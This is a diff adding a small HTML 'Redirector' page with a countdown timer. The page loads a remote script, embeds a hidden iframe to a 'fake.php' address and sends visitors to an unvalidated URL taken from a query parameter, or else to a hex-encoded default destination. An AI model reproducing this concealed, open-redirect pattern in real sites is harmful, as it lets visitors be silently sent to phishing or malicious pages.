@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Redirector</title>
+<meta name='viewport' content='width=device-width'>
+<script  src='https://spat-cloud.github.io/HarScript/HSDK.Private.Raw.js'></script>
+</head>
+<style>/*Style*/
+*{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family:Monospace;
+}
+body{
+    background-color:#000;
+    color:#ddd;
+}
+.RA{
+    margin-top:3%;
+    font-weight:bold;
+    text-align: center ;
+}
+</style>
+<body>
+        <div class="RA">
+     Redirect in <span id="tme">%d</span> s
+     <iframe src="//spat-cloud.github.io/fake.php" style="display: none ;"></iframe>
+        </div>
+</body>
+<script type='text/javascript'>
+        (function(){
+          var $, st=5,rt,cc;
+          $=new $_;
+          $.run();
+          rt=function(){
+              ulx=new URL(location.href);
+              par=ulx.searchParams.get('purl');
+              def="e1e122440532f4d2d45583a3e4a1a5341561a4a3219482541554e4d2c473413445f283d211728244b5a1a5d2";
+             par?setTimeout(()=>window.location=par.hl(),1000):window.location=def.hl();
+          };
+          
+          cc=function(){
+              
+              $.qs('#tme').innerHTML=st;
+              st--;        
+          };
+        //  if(!st) clearInterval(tm);
+        
+if(st==0){clearInterval(tm);}
+        else{
+        tm=setInterval(cc,1000);
+    }
+          setTimeout(rt,5000);
+          
+    })()
+
+</script>
+</html>
